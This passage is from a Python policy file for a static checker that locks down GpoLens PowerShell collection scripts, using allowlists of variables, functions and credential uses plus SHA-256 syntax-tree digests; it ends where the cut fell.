# Automatic and preference variables. The engine reads them, so binding one
# changes how *other* statements behave ($PSDefaultParameterValues injects
# parameters into later calls; $PSModuleAutoLoadingPreference/$ErrorAction-
# Preference/...); a write is refused unless it is in SPECIAL_BINDINGS. Any
# variable named *Preference is treated the same way.
_SPECIAL_VARIABLES = frozenset(
    {
        "$",
        "?",
        "^",
        "_",
        "args",
        "consolefilename",
        "enabledexperimentalfeatures",
        "error",
        "errorview",
        "event",
        "eventargs",
        "eventsubscriber",
        "executioncontext",
        "false",
        "foreach",
        "formatenumerationlimit",
        "home",
        "host",
        "input",
        "iscoreclr",
        "islinux",
        "ismacos",
        "iswindows",
        "lastexitcode",
        "logcommandhealthevent",
        "logcommandlifecycleevent",
        "logenginehealthevent",
        "logenginelifecycleevent",
        "logproviderhealthevent",
        "logproviderlifecycleevent",
        "matches",
        "maximumaliascount",
        "maximumdrivecount",
        "maximumerrorcount",
        "maximumfunctioncount",
        "maximumhistorycount",
        "maximumvariablecount",
        "myinvocation",
        "nestedpromptlevel",
        "null",
        "ofs",
        "outputencoding",
        "pid",
        "profile",
        "psboundparameters",
        "pscmdlet",
        "pscommandpath",
        "psculture",
        "psdebugcontext",
        "psdefaultparametervalues",
        "psedition",
        "psemailserver",
        "pshome",
        "psitem",
        "psnativecommandargumentpassing",
        "psnativecommanduseerroractionpreference",
        "psscriptroot",
        "pssenderinfo",
        "pssessionapplicationname",
        "pssessionconfigurationname",
        "pssessionoption",
        "psstyle",
        "psuiculture",
        "psversiontable",
        "pwd",
        "sender",
        "shellid",
        "stacktrace",
        "switch",
        "this",
        "transcript",
        "true",
    }
)
# Never referenced at all (read or write): engine-wide parameter injection,
# module auto-loading, and the engine object itself.
FORBIDDEN_VARIABLE_REFS = frozenset(
    {"psdefaultparametervalues", "psmoduleautoloadingpreference", "executioncontext"}
)
# The only automatic/preference variable bindings the collectors make.
SPECIAL_BINDINGS: dict[str, frozenset[tuple[str, str]]] = {
    "Export-GpoEstate.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
    "Export-GroupMembers.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
    "Export-Principals.ps1": frozenset(
        {
            ("erroractionpreference", "= 'Stop'"),
            ("matches", "= [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+')"),
            ("matches", "= [regex]::Matches($sddl, 'S-1-[0-9]+-[0-9-]+')"),
        }
    ),
    "Run-GpoLensCollection.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
}
# A variable may be the root of an index write (`$h[$k] = ...`) only here.
INDEX_ASSIGNMENT_ROOTS: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset({"principals", "groupmembers"}),
    "Export-GroupMembers.ps1": frozenset({"groupmembers"}),
    "Export-Principals.ps1": frozenset({"principals"}),
    "Run-GpoLensCollection.ps1": frozenset({"previous"}),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset(),
}
# The only targets of variable-writing common parameters (literal names).
COMMON_PARAM_TARGETS: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset({"zipenumerr", "srcerr"}),
    "Export-GroupMembers.ps1": frozenset(),
    "Export-Principals.ps1": frozenset(),
    "Run-GpoLensCollection.ps1": frozenset(),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset(),
}
# Exact set of functions each script defines. A redefinition (`function
# Assert-GpoLensRegularTree {}` later in the file) or a function shadowing an
# allowlisted cmdlet (`function Get-Item { ... }`) is not in the set.
LOCAL_FUNCTIONS: dict[str, tuple[str, ...]] = {
    "Export-GpoEstate.ps1": ("New-GpoExportZip", "Set-SectionProgress"),
    "Export-GroupMembers.ps1": (),
    "Export-Principals.ps1": (),
    "Run-GpoLensCollection.ps1": (
        "Write-GpoLensCollectionLog",
        "Get-GpoLensCompletedExports",
        "Assert-GpoLensRegularTree",
        "Assert-GpoLensCollectionOwner",
        "Invoke-GpoLensCollection",
    ),
    "GpoLensCollectionMarker.ps1": (
        "Read-GpoLensOwnerMarkerBytes",
        "Write-GpoLensOwnerMarkerBytes",
    ),
    "Register-GpoLensCollection.ps1": (
        "ConvertTo-GpoLensTaskArgument",
        "ConvertTo-GpoLensAbsolutePath",
        "Set-GpoLensCollectionOwner",
    ),
}
# SHA-256 of each local function's normalized syntax tree (the same row format
# as the golden, rooted at the FunctionDefinitionAst). HAND-MAINTAINED: the
# generator never writes this table (test_generator_never_writes_policy). Keys
# are function names; check_local_function_bodies compares casefolded.
LOCAL_FUNCTION_BODIES: dict[str, dict[str, str]] = {
    "Export-GpoEstate.ps1": {
        "New-GpoExportZip": ("aacc73f36d374f73a77e565caf6883eb5c1e244669f3fa8d545e944be8315c25"),
        "Set-SectionProgress": ("452134c5d14fa82771a8f7e1cd085b3621ee16dc33457432f1f5b5db3ad82cc6"),
    },
    "Export-GroupMembers.ps1": {},
    "Export-Principals.ps1": {},
    "Run-GpoLensCollection.ps1": {
        "Write-GpoLensCollectionLog": (
            "c063dec4d809ec58838c2f60022832f4e8bf67aaf839b70f54cba37b8214a36d"
        ),
        "Get-GpoLensCompletedExports": (
            "884c8f50670f56a5c6e432421ebd433981523bacbd5a0dea001c33d96f7f14cb"
        ),
        "Assert-GpoLensRegularTree": (
            "641bc5815235b9475ec326e3993752ac02a926fef931b616c15c68d99f802858"
        ),
        "Assert-GpoLensCollectionOwner": (
            "a9defc5b87009a3010dee3e57aecac76369ec4644c1cbae2472b236b9c981f7d"
        ),
        "Invoke-GpoLensCollection": (
            "3224d100fd66dae939805becde789ce6e7b51028adacdddd9163aa63cf1c3221"
        ),
    },
    "GpoLensCollectionMarker.ps1": {
        "Read-GpoLensOwnerMarkerBytes": (
            "fc4ea3b3baa91934c20ca92086e70949ef98073640aafd382a20a6437382b4e1"
        ),
        "Write-GpoLensOwnerMarkerBytes": (
            "85bacfbf2e5a9538af9b3ecbc60dbdcdfe8da9cef00a5b9a885e6dd0d3ccc9ca"
        ),
    },
    "Register-GpoLensCollection.ps1": {
        "ConvertTo-GpoLensTaskArgument": (
            "b21ec1b0406abf8920ffa137650660617e27a873b106c83e32db99e84df08699"
        ),
        "ConvertTo-GpoLensAbsolutePath": (
            "3167a68a6db407a4a1af18d6df9046eab0e70cb61a50e2950c93044b3b815ea0"
        ),
        "Set-GpoLensCollectionOwner": (
            "afb35b5aa433fc5611ac9dd1a2c1cb4ca4cd567b099ae0bdd4f6cc767bd4bb35"
        ),
    },
}

# Exact uses of secret-bearing variables (see check_secret_uses): (variable,
# enclosing function, normalized statement). HAND-MAINTAINED.
SECRET_USES: dict[str, tuple[tuple[str, str, str], ...]] = {
    "Export-GpoEstate.ps1": (),
    "Export-GroupMembers.ps1": (
        ("credential", "", "[System.Management.Automation.PSCredential]$Credential"),
        ("adparams", "", "$adParams = @{}"),
        ("credential", "", "$Credential"),
        ("adparams", "", "$adParams.Credential = $Credential"),
        ("credential", "", "$adParams.Credential = $Credential"),
        ("adparams", "", "Get-ADGroupMember -Identity $sid -Recursive @adParams -ErrorAction Stop"),
    ),
    "Export-Principals.ps1": (
        ("credential", "", "[System.Management.Automation.PSCredential]$Credential"),
        ("adparams", "", "$adParams = @{}"),
        ("credential", "", "$Credential"),
        ("adparams", "", "$adParams.Credential = $Credential"),
        ("credential", "", "$adParams.Credential = $Credential"),
        ("adparams", "", "Get-ADDomain @adParams"),
        (
            "adparams",
            "",
            (
                "Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                '"(objectClass=groupPolicyContainer)" -Properties '
                "nTSecurityDescriptor, displayName @adParams"
            ),
        ),
        ("adparams", "", "$adParams = @{}"),
        ("credential", "", "$Credential"),
        ("adparams", "", "$adParams.Credential = $Credential"),
        ("credential", "", "$adParams.Credential = $Credential"),
        ("adparams", "", "Get-ADDomain @adParams"),
        (
            "adparams",
            "",
            (
                "Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties "
                "objectClass, sAMAccountName, name @adParams -ErrorAction Stop"
            ),
        ),
    ),
    "Run-GpoLensCollection.ps1": (),
    "GpoLensCollectionMarker.ps1": (),
    "Register-GpoLensCollection.ps1": (
        ("credential", "", "[Parameter(ParameterSetName = 'Service')] [pscredential]$Credential"),
        ("credential", "", "-not $Credential"),
        (
            "credential",
            "",
            (
                "$Credential = Get-Credential -UserName $ServiceAccount -Message "
                "'Collection task credentials (saved only by Windows Task "
                "Scheduler)'"
            ),
        ),
        ("credential", "", "-not $Credential -or $Credential.UserName -ne $ServiceAccount"),
        ("credential", "", "-not $Credential -or $Credential.UserName -ne $ServiceAccount"),
        ("taskpassword", "", "$taskPassword = $Credential.GetNetworkCredential().Password"),
        ("credential", "", "$taskPassword = $Credential.GetNetworkCredential().Password"),
        (
            "taskpassword",
            "",
            (
                "Register-ScheduledTask -TaskName $TaskName -InputObject $task "
                "-User $ServiceAccount -Password $taskPassword -Force"
            ),
        ),
        ("taskpassword", "", "$taskPassword = $null"),
        ("credential", "", "$Credential = $null"),
    ),
}

# SHA-256 of each script's attributes + param block rows. HAND-MAINTAINED.
SCRIPT_HEADERS: dict[str, str] = {
    "Export-GpoEstate.ps1": ("6dbe34329001a4e2fe1c85e31716c69c9253ba4cbda2b9f10d8ed297910ffdb7"),
    "Export-GroupMembers.ps1": ("49a4d9070b03f9ca32a4e281eb1a8ae4b106eda3ae7e94573b508dc50c6c30e5"),
    "Export-Principals.ps1": ("dfa22517b497f3eeafb9a18678ff7495e2bcd72c74bce468b6beb89862d6efd4"),
    "Run-GpoLensCollection.ps1": (
        "874b6828b646e8479ce7408283e78169b4c84b4f8c03d9445ed230d941bbe733"
    ),
    "GpoLensCollectionMarker.ps1": (
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    ),
    "Register-GpoLensCollection.ps1": (
        "98c57e75887fbdc508701b1c27836d9a5566b4d7fd0842b689650eb66a6a5036"
    ),
}

# Per-statement subtree digests (see check_statement_digests). HAND-MAINTAINED,
# generated by scripts/print_statement_digests.py; the generator never writes it.
# Expression-valued pipeline inputs (see check_pipeline_inputs). HAND-MAINTAINED.
PIPELINE_INPUTS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
    "Export-GpoEstate.ps1": (
        (
            (
                "@($allGpc | ForEach-Object { [pscustomobject]@{ Id = $_.Name.Trim('{}'); "
                "DisplayName = $_.displayName } })"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$allGpc",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "'[]'",
            (
                "guard if ($DryRun) -> return",
                "if ($collectionErrors.Count -eq 0) after []",
            ),
        ),
        (
            "$collectionErrors",
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            "$allGpos",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$g.InheritedGpoLinks",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "try",
            ),
        ),
        (
            "$inh",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$allSids",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($sid in ($allSids | Sort-Object))",
            ),
        ),
        (
            "$allSids",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$principalsOut",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$principals.Keys",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$members",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gSid in $groupSids)",
                "try",
            ),
        ),
        (
            "$groupMembersOut",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$collectionErrors",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            "$collectionErrors",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                    "($sysvolErrors -eq 0)]"
                ),
            ),
        ),
    ),
    "Export-GroupMembers.ps1": (
        (
            "$principalsData.principals.PSObject.Properties",
            (),
        ),
        (
            "$out",
            (),
        ),
    ),
    "Export-Principals.ps1": (
        (
            "$allSids",
            ("foreach ($sid in $allSids | Sort-Object)",),
        ),
        (
            "$allSids",
            (),
        ),
        (
            "$out",
            (),
        ),
    ),
    "Run-GpoLensCollection.ps1": (
        (
            "[Text.Encoding]::UTF8.GetString($inventoryBytes).TrimStart([char]0xFEFF)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$_",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of ForEach-Object",
            ),
        ),
    ),
    "GpoLensCollectionMarker.ps1": (),
    "Register-GpoLensCollection.ps1": (),
}


STATEMENT_DIGESTS: dict[str, dict[str, str]] = {
    "Export-GpoEstate.ps1": {
        # FunctionDefinitionAst @ 0.1.0
        "0.1.0": ("69db5eaaa3ec656685a58379ab975eb99d9d617785b854766ef6172134a5de71"),
        # PipelineAst @ 0.1.0.0.1.0
        "0.1.0.0.1.0": ("0b6e03c542de4224359e81670402c285ba2f3074bd45a22a30e0844cce3c598f"),
        # AssignmentStatementAst @ 0.1.0.0.1.1
        "0.1.0.0.1.1": ("0b445cb95153e35ed68a244cf58967dbd3891802348e9a5db44b1cd06ed13027"),
        # TryStatementAst @ 0.1.0.0.1.2
        "0.1.0.0.1.2": ("ed93d015aad2a68345f219295fc928049dbfa0c60d8c5ab808fe228cf7b62efb"),
        # IfStatementAst @ 0.1.0.0.1.2.0.0
        "0.1.0.0.1.2.0.0": ("6f5bff3907c439c8584f430b010855d8f17d05e840c38e599b5fb42f2377899c"),
        # PipelineAst @ 0.1.0.0.1.2.0.0.1.0
        "0.1.0.0.1.2.0.0.1.0": ("d4fcbfe64f563dd7a0afff712be3953fe51a8bb7a31ff00e114f555664e53b32"),
        # AssignmentStatementAst @ 0.1.0.0.1.2.0.1
        "0.1.0.0.1.2.0.1": ("f264ce8101bf3cb61333e3692b4c33b9a33a0bfd0cf8fdc32269ece4681b3e39"),
        # AssignmentStatementAst @ 0.1.0.0.1.2.0.2
        "0.1.0.0.1.2.0.2": ("49a43b2b02142bca13b37b35f98676292ee189b40ce1b7130a5b310586b118ce"),
        # PipelineAst @ 0.1.0.0.1.2.0.2.1.0.0.0
        "0.1.0.0.1.2.0.2.1.0.0.0": (
            "a38321a39def924cef804ca61172c8efc27616d915faddfefd5250a947e6bd69"
        ),
        # IfStatementAst @ 0.1.0.0.1.2.0.3
        "0.1.0.0.1.2.0.3": ("35c07efbc7e51ec9e013a44713d27041f40e8faa993a381e086fd7941f12cf21"),
        # ThrowStatementAst @ 0.1.0.0.1.2.0.3.1.0
        "0.1.0.0.1.2.0.3.1.0": ("797bbc4daffefcf69eb323b1b4809667aa47496a884fe197be1082dadd6ad800"),
        # PipelineAst @ 0.1.0.0.1.2.0.3.1.0.0.0.0.0.0.0
        "0.1.0.0.1.2.0.3.1.0.0.0.0.0.0.0": (
            "8163ab450034cdee089814dc9e18901d6a46b053131c030392e8397796e3ae34"
        ),
        # AssignmentStatementAst @ 0.1.0.0.1.2.0.4
        "0.1.0.0.1.2.0.4": ("898f6727f1e75d27dbbc2bb8bd734d5c48c403bee3c6d61c40a0097a6de5da96"),
        # TryStatementAst @ 0.1.0.0.1.2.0.5
        "0.1.0.0.1.2.0.5": ("dc6f9b2e68da2aac627e317c14c41858531b0b79c2e01b18e28f7fd02b5e65ab"),
        # AssignmentStatementAst @ 0.1.0.0.1.2.0.5.0.0
        "0.1.0.0.1.2.0.5.0.0": ("84d713ed4c7d3591976054d09d03fc79831d50bb5da0a624e8688cd555c519b5"),
        # ForEachStatementAst @ 0.1.0.0.1.2.0.5.0.1
        "0.1.0.0.1.2.0.5.0.1": ("fdfbf2584099a0090630a335d2ce3f6fa39735745f9fdc0aa9a861cc2b1f889b"),
        # AssignmentStatementAst @ 0.1.0.0.1.2.0.5.0.1.2.0
        "0.1.0.0.1.2.0.5.0.1.2.0": (
            "c3b024b17bba74d032ed97f2d7a5a778919b7acc8f201dd0e4655dd3e16a91ba"
        ),
        # PipelineAst @ 0.1.0.0.1.2.0.5.0.1.2.1
        "0.1.0.0.1.2.0.5.0.1.2.1": (
            "a0396943a487a8074e87477f6876882a4af42b9e4154cde2d57f614971e56f3e"
        ),
        # PipelineAst @ 0.1.0.0.1.2.0.5.1.0
        "0.1.0.0.1.2.0.5.1.0": ("5748baef55ef18fec849058f2a9fa4e8ff464f2d65a18d71e8de297585293c36"),
        # PipelineAst @ 0.1.0.0.1.2.0.6
        "0.1.0.0.1.2.0.6": ("a82505f52dd16144f6bae57709718973054ed11b4e68c104de6811a38d3f82a9"),
        # PipelineAst @ 0.1.0.0.1.2.0.6.0.1.1.0.0
        "0.1.0.0.1.2.0.6.0.1.1.0.0": (
            "cfb83f21be50abf832b9357f123813d3303f14e09f4d3ec93c02cd7b6c3acc05"
        ),
        # IfStatementAst @ 0.1.0.0.1.2.1.0.0
        "0.1.0.0.1.2.1.0.0": ("1482b3de0167135ee95e3031a6ec62af85e9c3acd485679f6a951ce488f1f892"),
        # PipelineAst @ 0.1.0.0.1.2.1.0.0.1.0
        "0.1.0.0.1.2.1.0.0.1.0": (
            "88195d8269cfe4cf21a345bdcb4417576165a73455dbe674afff358f3b82b194"
        ),
        # ThrowStatementAst @ 0.1.0.0.1.2.1.0.1
        "0.1.0.0.1.2.1.0.1": ("af6298f820f7c79cc6b0bea0b867c98c3d6483acb894ae462f87ccb98267fa3c"),
        # PipelineAst @ 0.1.0.0.1.2.1.0.1.0.0.0.0.0.0.0.0.0.0.0
        "0.1.0.0.1.2.1.0.1.0.0.0.0.0.0.0.0.0.0.0": (
            "8fbabafe6cc8830f33bb8b53d8a6fcc3b006b92130b4cb065b44eee17ee3f94a"
        ),
        # AssignmentStatementAst @ 0.1.1
        "0.1.1": ("2b9197b3aef003d36e8fae842bb78c818ec2b65d680ac628fbbed20f0d89426b"),
        # ForEachStatementAst @ 0.1.2
        "0.1.2": ("463175e4e80513357cd41efe510ed5747cd4b81a7e5f7fc4aca863296a59eb79"),
        # PipelineAst @ 0.1.2.1.0.0.0.0
        "0.1.2.1.0.0.0.0": ("6dfea6a57eeb1a0ef4ba9aabbaa749db88692956b4a72c60271618f359897b1c"),
        # IfStatementAst @ 0.1.2.2.0
        "0.1.2.2.0": ("b881e116e6c076f07e2a4758a70409da81d3bdcf6087df8bb67c684127a2cfb6"),
        # PipelineAst @ 0.1.2.2.0.1.0
        "0.1.2.2.0.1.0": ("f6dac679504c9bfa258e2f520f6a6029950068e1e68fbf95eb83564a5cffaf7e"),
        # TryStatementAst @ 0.1.3
        "0.1.3": ("d1bdad57fe4be45e79ea0ad3d26d1739a17cdfee264eb9bae7d2c99ec1834bcd"),
        # IfStatementAst @ 0.1.3.0.0
        "0.1.3.0.0": ("ffb7f467683c94d474445b83b6dfe91d1a9855eec038f3810d5afd4387a9dbf0"),
        # PipelineAst @ 0.1.3.0.0.1.0
        "0.1.3.0.0.1.0": ("8d94a869b5842b5c47a7f938261535f5680d15fc43483e2df9e1360dc8a3aaf3"),
        # AssignmentStatementAst @ 0.1.3.0.1
        "0.1.3.0.1": ("f71a92034ccad293b57091359ec1b18aad357099317372427fe819618b4b78a5"),
        # PipelineAst @ 0.1.3.0.2
        "0.1.3.0.2": ("a9d1800b17310b0604fb08dd31499155807105df3ff52c564f2b9d3a9c8eebd3"),
        # PipelineAst @ 0.1.3.0.3
        "0.1.3.0.3": ("16ff4595a6bb875214a0f032efe4e41ba19785ae75097fae5f5d8ccb464dc91b"),
        # PipelineAst @ 0.1.3.1.0.0
        "0.1.3.1.0.0": ("095230d8145cc1cf5e1ad68cffffbfdc1113881f18777d9338caaa9987f43a3f"),
        # PipelineAst @ 0.1.3.1.0.0.0.1.1.0.0
        "0.1.3.1.0.0.0.1.1.0.0": (
            "1821d5ee4dfa45ad82d1bbec2a8f2822b4cbb6a8709512efeb5eaf979f9fb0e8"
        ),
        # AssignmentStatementAst @ 0.1.4
        "0.1.4": ("3d3e7ea875a8cdb415ea78f9976330186120ac527808a0e80045ca4ca56e5d5f"),
        # AssignmentStatementAst @ 0.1.5
        "0.1.5": ("888f4207623bf02db45275c6f34c8c3a5f0b25695a01970d0ec3be6471a562dc"),
        # AssignmentStatementAst @ 0.1.6
        "0.1.6": ("66ceb8999e39c6af6b9debcee1b71b93b088496cca55a302a7a0e6e0436a82c5"),
        # PipelineAst @ 0.1.6.1.0.2.0.0.0
        "0.1.6.1.0.2.0.0.0": ("30204c8d711ae1ec9e3d00980c7d9919c1b053b49a11212688a5d816d955bd95"),
        # AssignmentStatementAst @ 0.1.7
        "0.1.7": ("517bf26217841dc2c67319667403a80ddd4c3d0345c7acec2f4f122fd6dc2c0a"),
        # AssignmentStatementAst @ 0.1.8
        "0.1.8": ("b9508a5981db053e0e316a671e57ccef5e3c22e9309aa2d2e64968c2c07001e4"),
        # AssignmentStatementAst @ 0.1.9
        "0.1.9": ("f79d0a334a3e7f91e2407e6f5531291a0142833a42e1aa145408125c97dd28ad"),
        # PipelineAst @ 0.1.9.1.0.0.0.0
        "0.1.9.1.0.0.0.0": ("7807118ac76240d44c374ce2e90c45f6941129a27b74119dc0b1d38eabb27be9"),
        # AssignmentStatementAst @ 0.1.10
        "0.1.10": ("2f9bd7f7a58593589c0b2045dbe11ce5df2d176379dc0b1cce8ea542a90f5b32"),
        # PipelineAst @ 0.1.10.1.0.0.0.0
        "0.1.10.1.0.0.0.0": ("4f875f7ea2e6c83d24e1e1471fda80c68e4cb2a0ceb06d6843f97908da3d952b"),
        # AssignmentStatementAst @ 0.1.11
        "0.1.11": ("f706b6dbee09d78dac64ba72623cccd6970759915e44564b3165c5c022a29062"),
        # PipelineAst @ 0.1.11.1.0.0.0.0
        "0.1.11.1.0.0.0.0": ("2830ad95609139c1a5fc303546a71c463f8924e93a642c50525f835242f058dc"),
        # PipelineAst @ 0.1.11.1.0.0.0.0.0.2.0.0.0
        "0.1.11.1.0.0.0.0.0.2.0.0.0": (
            "d97e66e51f4b45b5b337b9374fa215b5264479217c23676311fc7a46d6da9fcc"
        ),
        # IfStatementAst @ 0.1.12
        "0.1.12": ("dc78c9329a3171f5132a5e7a12328a9845bc2643f1443e9fc57d60fbda545faa"),
        # AssignmentStatementAst @ 0.1.12.1.0
        "0.1.12.1.0": ("caeb5b62bb9bc1b54e47dd6f65fbfacf7931b6bb987c7de9350ab99a5208506b"),
        # IfStatementAst @ 0.1.12.1.1
        "0.1.12.1.1": ("8cfc861f48b489ec101c9e1cf4aefa5c26c0fa9e5e73f8dea186791cc16b6f2c"),
        # AssignmentStatementAst @ 0.1.12.1.1.1.0
        "0.1.12.1.1.1.0": ("b22e647314bc15430d19548e0badf174486a3f61f1640082e6e9822f5a2bcde0"),
        # PipelineAst @ 0.1.12.1.1.1.0.1.0.0.0.0
        "0.1.12.1.1.1.0.1.0.0.0.0": (
            "e668b894776e86dde942ae2f74314e48ae8ac7268d6d30d7881e9b0e28af69a2"
        ),
        # PipelineAst @ 0.1.12.1.1.1.0.1.0.1.0.0
        "0.1.12.1.1.1.0.1.0.1.0.0": (
            "856da8de3c5bcc8f76710e3c8e6183fd3c39c95f2ce9e17aa9bd46b3010c107c"
        ),
        # AssignmentStatementAst @ 0.1.12.1.1.1.1
        "0.1.12.1.1.1.1": ("1450d70ccd4d993d407d1d409d76aaaad4376d731cbc389e741240de140be90d"),
        # AssignmentStatementAst @ 0.1.12.1.1.1.2
        "0.1.12.1.1.1.2": ("b0bbe805b6af7cf567247d6c7a3aace4bf197501e678e8a2625df2f5614957c2"),
        # PipelineAst @ 0.1.12.1.1.1.2.1.0.0.0.0
        "0.1.12.1.1.1.2.1.0.0.0.0": (
            "9412e8c11cc653cc49b2b675dea8b7dfffd19e45c3807fe8c210604338a7fd8f"
        ),
        # PipelineAst @ 0.1.12.1.2
        "0.1.12.1.2": ("5853df1f6bb20fa6f7cfba6d1a6136e38dffe602da6b75f4b6f5f973c2f7957f"),
        # PipelineAst @ 0.1.12.1.3
        "0.1.12.1.3": ("54b5bca818f813bafde334e4582fcdbb36c1736803a00b9abf3cf84e94603f4f"),
        # PipelineAst @ 0.1.12.1.3.0.1.0.0.0
        "0.1.12.1.3.0.1.0.0.0": (
            "5d751c80869f4a17ab225faa0ffceaa1b4afda9fcc1859d39c0a127ae9f9551b"
        ),
        # PipelineAst @ 0.1.12.1.4
        "0.1.12.1.4": ("b03111eeb98599b833aebdc9654c51e0dbd64debff779fc1fc51b121f7406470"),
        # PipelineAst @ 0.1.12.1.5
        "0.1.12.1.5": ("0c6a112f1777cdf3eb5ff9be4d72a19dfa502e08b26405e4a9429470fb98f604"),
        # PipelineAst @ 0.1.12.1.6
        "0.1.12.1.6": ("e135ae6ecd38c1333019c122474126c47d8bfc193da28517689659e5119e981f"),
        # PipelineAst @ 0.1.12.1.7
        "0.1.12.1.7": ("f05760e8f4ecfe8a3e52a6f79da4a29a8bf7b702f92e7385491aea66af927278"),
        # PipelineAst @ 0.1.12.1.8
        "0.1.12.1.8": ("ab8eb05ed32a5a99148ebe4512efb7f03da90aafdb2ad77d8f31e23d3e2dfe6c"),
        # PipelineAst @ 0.1.12.1.9
        "0.1.12.1.9": ("4f3df2720cf1ae393260ea958e02e7773737d1ee137e1de089c6d7329b951609"),
        # IfStatementAst @ 0.1.12.1.9.0.1.0.0.0
        "0.1.12.1.9.0.1.0.0.0": (
            "89978cdda8a1d6709ea7b23f8326744fe41bb914032d156b77caefa0fdec1ed1"
        ),
        # PipelineAst @ 0.1.12.1.9.0.1.0.0.0.1.0
        "0.1.12.1.9.0.1.0.0.0.1.0": (
            "8c87b7f415c0be6f0c07118bcddc18c343ca98c1effdbc21f1eb9a6df71324a7"
        ),
        # PipelineAst @ 0.1.12.1.9.0.1.0.0.0.2.0
        "0.1.12.1.9.0.1.0.0.0.2.0": (
            "38085d7bbb780045f3b5929b42d198dd7ab72d75e95e1cdea2dc007376f6c2cc"
        ),
        # PipelineAst @ 0.1.12.1.10
        "0.1.12.1.10": ("bac2b822f678230ce81ce6af2b97b39d7ad0f1cad8c7266934c681599ff7d3d2"),
        # IfStatementAst @ 0.1.12.1.10.0.1.0.0.0
        "0.1.12.1.10.0.1.0.0.0": (
            "e1a50969998b8d9cf67ed387eb350708a181fa8f0b6c924ea127bf533bb68154"
        ),
        # PipelineAst @ 0.1.12.1.10.0.1.0.0.0.1.0
        "0.1.12.1.10.0.1.0.0.0.1.0": (
            "104725d2bc8ae42383e549f43bfa57596208673f15775938f8c6220088083dbd"
        ),
        # PipelineAst @ 0.1.12.1.10.0.1.0.0.0.2.0
        "0.1.12.1.10.0.1.0.0.0.2.0": (
            "da343e2b8a63dbc04bc9d25c0474ad49eed0d5a6fa84f376a3888a082ec75d91"
        ),
        # ReturnStatementAst @ 0.1.12.1.11
        "0.1.12.1.11": ("e4244de60c69be85467ba5f0d07edac15962e9bd8ca5e47145b7c5b121e7dfcd"),
        # PipelineAst @ 0.1.13
        "0.1.13": ("b916fa78d9108e0554078d039c46ec04136805b6fe1f6518e87590e8b141f7ec"),
        # PipelineAst @ 0.1.14
        "0.1.14": ("0f25aac8dd330276d0e3d3264ca524f503d5c3634d3bcddd239b6dcc3887b9ee"),
        # PipelineAst @ 0.1.14.0.1.0.0.0
        "0.1.14.0.1.0.0.0": ("866c3a40885e8f968c08d6c38e3346a802d78b02271c2310f3de992f2edbb072"),
        # AssignmentStatementAst @ 0.1.15
        "0.1.15": ("b0e2e1e5e0ccc90808019bdd0f6b2c1b4c05880b8515e6dfa12fba5f555d1182"),
        # AssignmentStatementAst @ 0.1.16
        "0.1.16": ("6dcd1677271ea6dfbdb7b401ecc9283ded718c64214cebebb1d34eee8382c8a1"),
        # AssignmentStatementAst @ 0.1.17
        "0.1.17": ("cf7e1702796058eaf08ac2dabf9ca16d1ab586d86420e40353f7e1c95c9213db"),
        # AssignmentStatementAst @ 0.1.18
        "0.1.18": ("ef8f83f1f786c368b88da77f52c9a5e830d1dedbed74ca0b77f44036afc7af38"),
        # FunctionDefinitionAst @ 0.1.19
        "0.1.19": ("1270a5ae9d1a9fc2faefac2012d8eb33063f4af050d1421d09c77e97976caa8c"),
        # AssignmentStatementAst @ 0.1.19.0.1.0
        "0.1.19.0.1.0": ("9d21233d2471370a401d541e4452902488322a52a46c5b82cf275c9c7c8c3faa"),
        # PipelineAst @ 0.1.19.0.1.1
